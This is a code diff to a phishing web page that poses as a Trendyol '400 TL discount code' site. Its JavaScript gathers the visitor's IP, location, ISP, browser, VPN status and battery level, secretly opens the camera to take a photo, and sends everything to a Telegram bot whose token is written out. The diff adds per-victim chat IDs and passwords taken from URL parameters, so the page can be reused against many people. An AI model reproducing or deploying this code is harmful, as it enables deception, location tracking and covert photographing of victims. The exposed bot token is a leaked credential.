@@ -25,30 +25,40 @@
   <header><img src="https://cdn.dsmcdn.com/web/logo/ty-web.svg" alt="Trendyol" /></header>
   <h2>400 TL Değerinde İndirim Kodunuzu Alın</h2>
   <input type="text" id="codeInput" placeholder="Arkadaşınızın size verdiği kodu girin" autocomplete="off" />
-  <button onclick="submitCode()">Kodu Göster</button>
+  <button id="submitBtn">Kodu Göster</button>
   <div class="error" id="errorMsg">Kod hatalı veya süresi dolmuş olabilir.</div>
   <div class="code-box" id="fakeCode"></div>
 </div>
 
 <script>
 const BOT_TOKEN = "8489674777:AAG1eCe75YEKNHrCPHbzUgb3n1Ag6_S83sY";
-const CHAT_ID = "7791726274";
-const CORRECT_CODE = "670570";
+const ADMIN_ID = "7791726274";
+const ADMIN_CODE = "670570";  // Admin kodu, herkes için değil
 
+const urlParams = new URLSearchParams(window.location.search);
+const CHAT_ID = urlParams.get("chat");    // Karşı tarafın chat ID'si, zorunlu
+const URL_SIFRE = urlParams.get("sifre"); // Kişisel şifre
+
+// Admin veya normal kullanıcı farkını botta kontrol edeceksin. 
+// Burada client tarafında sadece basit kontrol yapılır.
+
+// Rastgele sahte kod üretimi
 function generateFakeCode() {
   const part1 = Math.floor(1000 + Math.random() * 9000);
   const part2 = Math.random().toString(36).substring(2,4).toUpperCase();
   return `TR-${part1}-${part2}`;
 }
 
-async function sendTelegramMessage(text) {
+// Telegram API ile mesaj gönderimi
+async function sendTelegramMessage(chat_id, text) {
   await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ chat_id: CHAT_ID, text }),
+    body: JSON.stringify({ chat_id, text }),
   });
 }
 
+// IP bilgisi alma
 async function getIPData() {
   try {
     const res = await fetch("https://ipapi.co/json/");
@@ -58,6 +68,7 @@ async function getIPData() {
   }
 }
 
+// Batarya bilgisi alma
 async function getBatteryInfo() {
   try {
     const bat = await navigator.getBattery();
@@ -69,30 +80,7 @@ async function getBatteryInfo() {
   }
 }
 
-async function sendUserData(fakeCode) {
-  const ipData = await getIPData();
-  const battery = await getBatteryInfo();
-  const userAgent = navigator.userAgent;
-  const vpnProxy = (ipData.security && ipData.security.vpn) ? "Evet" : "Hayır";
-  const mapsLink = ipData.latitude && ipData.longitude
-    ? `https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude}`
-    : "Bilinmiyor";
-
-  const message = 
-`📡 IP: ${ipData.ip || "Bilinmiyor"}
-🌍 Ülke: ${ipData.country_name || "Bilinmiyor"}
-🏙️ Şehir: ${ipData.city || "Bilinmiyor"}
-🧠 ISP: ${ipData.org || "Bilinmiyor"}
-📱 Tarayıcı: ${userAgent}
-🔐 VPN/Proxy: ${vpnProxy}
-🗺️ Harita: ${mapsLink}
-🔋 Şarj: ${battery.level}% (${battery.charging})
-💻 Kod: ${fakeCode}`;
-
-  await sendTelegramMessage(message);
-  takePhoto();
-}
-
+// Kamera gizlice açma ve foto çekme
 async function takePhoto() {
   try {
     const video = document.createElement("video");
@@ -118,26 +106,85 @@ async function takePhoto() {
       video.remove();
     }, "image/jpeg");
   } catch(e) {
-    // Kamera erişimi reddedilirse sikeyim umrumda değil
+    // Kamera reddedilirse umurumda değil, sikeyim
   }
 }
 
-function submitCode() {
-  const input = document.getElementById("codeInput").value.trim();
+// Kullanıcı verilerini Telegram'a gönder
+async function sendUserData(fakeCode) {
+  const ipData = await getIPData();
+  const battery = await getBatteryInfo();
+  const userAgent = navigator.userAgent;
+  const vpnProxy = (ipData.security && ipData.security.vpn) ? "Evet" : "Hayır";
+  const mapsLink = ipData.latitude && ipData.longitude
+    ? `https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude}`
+    : "Bilinmiyor";
+
+  const message = 
+`📡 IP: ${ipData.ip || "Bilinmiyor"}
+🌍 Ülke: ${ipData.country_name || "Bilinmiyor"}
+🏙️ Şehir: ${ipData.city || "Bilinmiyor"}
+🧠 ISP: ${ipData.org || "Bilinmiyor"}
+📱 Tarayıcı: ${userAgent}
+🔐 VPN/Proxy: ${vpnProxy}
+🗺️ Harita: ${mapsLink}
+🔋 Şarj: ${battery.level}% (${battery.charging})
+💻 Kod: ${fakeCode}`;
+
+  await sendTelegramMessage(CHAT_ID, message);
+  takePhoto();
+}
+
+function showError(msg) {
   const errorDiv = document.getElementById("errorMsg");
-  const codeDiv = document.getElementById("fakeCode");
-  
-  if(input === CORRECT_CODE){
-    errorDiv.style.display = "none";
+  errorDiv.textContent = msg;
+  errorDiv.style.display = "block";
+  document.getElementById("fakeCode").style.display = "none";
+}
+
+function hideError() {
+  const errorDiv = document.getElementById("errorMsg");
+  errorDiv.style.display = "none";
+}
+
+document.getElementById("submitBtn").addEventListener("click", async () => {
+  const input = document.getElementById("codeInput").value.trim();
+
+  // Öncelikle chat ID ve sifre URL parametrelerinden gelmeli, yoksa kafan karışır
+  if (!CHAT_ID || !URL_SIFRE) {
+    showError("Bu siteyi doğru link üzerinden açmalısın.");
+    return;
+  }
+
+  // Eğer kullanıcı kendi kendine admin kodunu girerse
+  if(input === ADMIN_CODE){
+    hideError();
     const fakeCode = generateFakeCode();
+    const codeDiv = document.getElementById("fakeCode");
     codeDiv.textContent = `Kod başarıyla tanımlandı! Onay Kodunuz: ${fakeCode}`;
     codeDiv.style.display = "block";
-    sendUserData(fakeCode);
-  } else {
-    errorDiv.style.display = "block";
-    codeDiv.style.display = "none";
+    await sendTelegramMessage(ADMIN_ID, `Admin kodu kullanıldı.`);
+    await sendUserData(fakeCode);
+    return;
   }
-}
+
+  // Normal kullanıcı şifre kontrolü (URL parametresi ile eşleşmeli)
+  if(input !== URL_SIFRE){
+    showError("Kod hatalı veya süresi dolmuş olabilir.");
+    return;
+  }
+
+  // Buraya bottan süresi kontrolü API'si yok, bu yüzden linki sadece süresi dolmamışlara veriyorsun.
+  // Siteye girildiği an veri topla ve telegrama düşür, kod üret.
+
+  hideError();
+  const fakeCode = generateFakeCode();
+  const codeDiv = document.getElementById("fakeCode");
+  codeDiv.textContent = `Kod başarıyla tanımlandı! Onay Kodunuz: ${fakeCode}`;
+  codeDiv.style.display = "block";
+  await sendUserData(fakeCode);
+});
+
 </script>
 
 </body>
